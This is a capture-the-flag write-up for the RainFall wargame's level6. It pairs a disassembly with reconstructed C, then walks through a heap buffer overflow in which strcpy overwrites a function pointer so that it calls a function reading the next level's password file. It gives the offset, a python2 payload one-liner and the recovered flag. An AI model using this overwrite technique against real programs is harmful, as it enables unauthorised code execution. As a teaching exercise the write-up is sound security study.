# Source Code

<table  style="margin: 0 auto;">
  <tr>
    <th>Assembly Code</th>
    <th>C Code</th>
  </tr>
  <tr>
    <td>
      <pre><code class="language-asm">
Dump of assembler code for function main:
   0x0804847c <+0>:     push   ebp
   0x0804847d <+1>:     mov    ebp,esp
   0x0804847f <+3>:     and    esp,0xfffffff0
   0x08048482 <+6>:     sub    esp,0x20
   0x08048485 <+9>:     mov    DWORD PTR [esp],0x40
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>
   0x08048491 <+21>:    mov    DWORD PTR [esp+0x1c],eax
   0x08048495 <+25>:    mov    DWORD PTR [esp],0x4
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:    mov    DWORD PTR [esp+0x18],eax
   0x080484a5 <+41>:    mov    edx,0x8048468
   0x080484aa <+46>:    mov    eax,DWORD PTR [esp+0x18]
   0x080484ae <+50>:    mov    DWORD PTR [eax],edx
   0x080484b0 <+52>:    mov    eax,DWORD PTR [ebp+0xc]
   0x080484b3 <+55>:    add    eax,0x4
   0x080484b6 <+58>:    mov    eax,DWORD PTR [eax]
   0x080484b8 <+60>:    mov    edx,eax
   0x080484ba <+62>:    mov    eax,DWORD PTR [esp+0x1c]
   0x080484be <+66>:    mov    DWORD PTR [esp+0x4],edx
   0x080484c2 <+70>:    mov    DWORD PTR [esp],eax
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    eax,DWORD PTR [esp+0x18]
   0x080484ce <+82>:    mov    eax,DWORD PTR [eax]
   0x080484d0 <+84>:    call   eax
   0x080484d2 <+86>:    leave
   0x080484d3 <+87>:    ret

Dump of assembler code for function m:
   0x08048468 <+0>:     push   ebp
   0x08048469 <+1>:     mov    ebp,esp
   0x0804846b <+3>:     sub    esp,0x18
   0x0804846e <+6>:     mov    DWORD PTR [esp],0x80485d1
   0x08048475 <+13>:    call   0x8048360 <puts@plt>
   0x0804847a <+18>:    leave
   0x0804847b <+19>:    ret

Dump of assembler code for function n:
   0x08048454 <+0>:     push   ebp
   0x08048455 <+1>:     mov    ebp,esp
   0x08048457 <+3>:     sub    esp,0x18
   0x0804845a <+6>:     mov    DWORD PTR [esp],0x80485b0
   0x08048461 <+13>:    call   0x8048370 <system@plt>
   0x08048466 <+18>:    leave
   0x08048467 <+19>:    ret
End of assembler dump.
      </code></pre>
    </td>
    <td>
      <pre><code class="language-c">
void n() {
  system("/bin/cat /home/user/level7/.pass");
}

void m() {
  puts("Nope");
}

int main(int argc, char* argv[]) {
  void *func;
  char *buff;

  buff = malloc(64);
  func = malloc(4);
  *func = m;
  strcpy(buff, argv[1]);
  (*func)();
}
      </code></pre>
    </td>
  </tr>
</table>



# Exploring

First look, we can see that `strcpy` vulnerable to buffer overflow, which is copies `argv[1]` to `buff` without checking if the input exceeds the allocated memory size of destination `buff`.

Second, we have two allocated memory blocks using `malloc`, the first one `buff` with size **64**, second one is `func` with **4** of size.

the blocks are allocated in memory in aligned way like below:

```
             H          e              a          p
─────────────────────────────────────────────────────────────────────────────────────
   |         buff (size 64)        |          |  func (size: 4) |
─────────────────────────────────────────────────────────────────────────────────────
   ^                               ^          ^                 ^
 buff                           buff+64      func             func+4
```

`strcpy` can copy more than `64`, reaching `func` block.


# Exploting

Before coping `argv[1` to `buff`, they assign `m` function address to `func`, after that they call back to `m` from `func`.

Yes, we can override `func` by exceeds the `buff` size which is **64**, with malicious function, in this case is `n` that read **level7 .pass** file for us.

Get offset of `func` from `buff`.

```
python3 tools/cyclic.py -g 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A


   0x080484ce <+82>:    mov    eax,DWORD PTR [eax]
=> 0x080484d0 <+84>:    call   eax
   0x080484d2 <+86>:    leave
   0x080484d3 <+87>:    ret
End of assembler dump.

gdb-peda$ p $eax
$2 = 0x41346341


python3 tools/cyclic.py -o 0x41346341
Offset found at: 72
```

So the offset is **72**.


The Payload format be like:

```
a * 72 + 'address of n'
```

Address of `n` is `\x54\x84\x04\x08`.

The final Payload:

```
python2 -c "print 'a' * 72 + '\x54\x84\x04\x08'"
```

Output:
```
level6@RainFall:~$ ./level6 `python2 -c "print 'a' * 72 + '\x54\x84\x04\x08'"`
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

We got the level7's password, let's move on to the next challenge `level7`.
